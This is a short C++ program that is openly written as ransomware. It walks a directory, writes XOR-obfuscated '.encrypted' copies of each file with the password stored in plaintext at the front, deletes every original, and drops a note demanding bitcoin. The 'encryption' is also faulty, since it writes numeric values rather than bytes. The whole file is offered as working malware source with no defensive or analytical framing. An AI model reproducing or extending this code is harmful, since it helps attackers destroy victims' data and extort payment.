#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>

using namespace std;
namespace fs = std::filesystem;

int main(int argc, char *argv[]) {
    string directory = argv[1];
    string password = "your-password-here";
    
    for (const auto &entry : fs::directory_iterator(directory)) {
        if (entry.is_regular_file()) {
            string filename = entry.path().string();
            string encrypted_filename = filename + ".encrypted";
            ifstream input(filename, ios::binary);
            ofstream output(encrypted_filename, ios::binary);
            output << password;
            char c;
            while (input.get(c)) {
                output << (c ^ password[0]);
            }
            input.close();
            output.close();
            fs::remove(filename);
        }
    }
    
    string ransom_note = "All your files have been encrypted. To get the decryption key, send $1000 worth of bitcoin to this address: 1234567890. Once the payment is confirmed, send an email to this address: hacker@example.com with your Bitcoin address and we'll send you the decryption key.";
    ofstream ransom_note_file("ransom_note.txt");
    ransom_note_file << ransom_note;
    ransom_note_file.close();
    
    return 0;
}
